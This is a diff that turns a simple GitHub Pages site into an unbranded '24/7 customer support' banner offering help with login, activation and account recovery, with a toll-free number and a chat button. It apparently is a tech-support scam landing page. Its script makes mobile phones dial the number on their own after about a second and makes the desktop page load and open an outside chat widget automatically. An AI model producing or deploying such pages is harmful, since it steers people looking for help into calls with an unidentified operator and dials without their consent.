@@ -1,25 +1,242 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>My Website</title>
-    <style>
-        body{
-            font-family:Arial,sans-serif;
-            text-align:center;
-            padding:50px;
-        }
-        .btn{
-            background:#007bff;
-            color:#fff;
-            padding:12px 20px;
-            text-decoration:none;
-            border-radius:5px;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Customer Support Banner</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%23facc15'/><text x='45%' y='75%' font-size='90' text-anchor='middle' fill='black' font-weight='bold'>N</text></svg>">
+
+
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif;
+}
+
+body{
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+background:#050816;
+overflow:hidden;
+position:relative;
+}
+
+/* Spotlight Background */
+body::before{
+content:'';
+position:absolute;
+width:700px;
+height:700px;
+background:radial-gradient(circle, rgba(0,140,255,0.35), transparent 70%);
+top:-200px;
+left:-150px;
+filter:blur(40px);
+}
+
+body::after{
+content:'';
+position:absolute;
+width:700px;
+height:700px;
+background:radial-gradient(circle, rgba(0,255,170,0.20), transparent 70%);
+bottom:-250px;
+right:-150px;
+filter:blur(50px);
+}
+
+.banner{
+position:relative;
+width:90%;
+max-width:950px;
+background:rgba(255,255,255,0.08);
+border:1px solid rgba(255,255,255,0.10);
+backdrop-filter:blur(20px);
+border-radius:30px;
+padding:60px 40px;
+text-align:center;
+box-shadow:0 10px 40px rgba(0,0,0,0.4);
+z-index:2;
+}
+
+.badge{
+display:inline-block;
+padding:10px 18px;
+border-radius:50px;
+background:rgba(255,255,255,0.10);
+color:#dbeafe;
+font-size:14px;
+margin-bottom:20px;
+letter-spacing:1px;
+}
+
+h1{
+font-size:60px;
+line-height:1.1;
+font-weight:800;
+color:#ffffff;
+margin-bottom:20px;
+}
+
+h1 span{
+color:#4da3ff;
+}
+
+p{
+font-size:20px;
+color:#d1d5db;
+line-height:1.7;
+max-width:700px;
+margin:auto;
+margin-bottom:35px;
+}
+
+.phone-number{
+font-size:42px;
+font-weight:800;
+color:#ffffff;
+margin-bottom:30px;
+}
+
+.buttons{
+display:flex;
+justify-content:center;
+gap:20px;
+flex-wrap:wrap;
+}
+
+.btn{
+text-decoration:none;
+padding:18px 34px;
+font-size:20px;
+font-weight:700;
+border-radius:16px;
+transition:0.3s;
+}
+
+.call-btn{
+background:#2563eb;
+color:#fff;
+box-shadow:0 0 25px rgba(37,99,235,0.4);
+}
+
+.call-btn:hover{
+background:#1d4ed8;
+transform:translateY(-2px);
+}
+
+.chat-btn{
+background:#16a34a;
+color:#fff;
+box-shadow:0 0 25px rgba(22,163,74,0.4);
+}
+
+.chat-btn:hover{
+background:#15803d;
+transform:translateY(-2px);
+}
+
+@media(max-width:768px){
+
+.banner{
+padding:40px 25px;
+}
+
+h1{
+font-size:38px;
+}
+
+p{
+font-size:17px;
+}
+
+.phone-number{
+font-size:30px;
+}
+
+.buttons{
+flex-direction:column;
+}
+
+.btn{
+width:100%;
+}
+
+.chat-btn{
+display:none;
+}
+
+}
+</style>
 </head>
 <body>
-    <h1>Welcome to My Website</h1>
-    <p>This site is hosted on GitHub Pages.</p>
-    <a href="https://example.com" class="btn">Login Now</a>
+
+<div class="banner">
+
+<div class="badge">
+24/7 CUSTOMER SUPPORT
+</div>
+
+<h1>
+Need <span>Support?</span>
+</h1>
+
+<p>
+Get instant help with login, setup, activation, customer support, installation, updates, account recovery, and troubleshooting assistance.
+</p>
+
+<div class="phone-number">
++1 (877) 832-6096
+</div>
+
+<div class="buttons">
+
+<a href="tel:+18778326096" class="btn call-btn">
+📞 Call Customer Support
+</a>
+
+<a href="#" class="btn chat-btn" onclick="if(window.arslive){arslive('openChat')} return false;">
+💬 Chat With Support
+</a>
+
+</div>
+
+</div>
+
+<script>
+const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
+
+function loadChatScript(){
+  const s = document.createElement('script');
+  s.src = "https://chat.arslive.com/widget.js";
+  document.body.appendChild(s);
+}
+
+if(isMobile){
+  // Mobile: hide chat completely + auto dial
+  const chatBtn = document.querySelector('.chat-btn');
+  if(chatBtn) chatBtn.style.display = 'none';
+
+  setTimeout(function(){
+    window.location.href = 'tel:+18778326096';
+  }, 1200);
+
+}else{
+  // Desktop only: load chat
+  loadChatScript();
+
+  setTimeout(function(){
+    if(window.arslive){
+      arslive('openChat');
+    }
+  }, 1500);
+}
+</script>
+
 </body>
 </html>
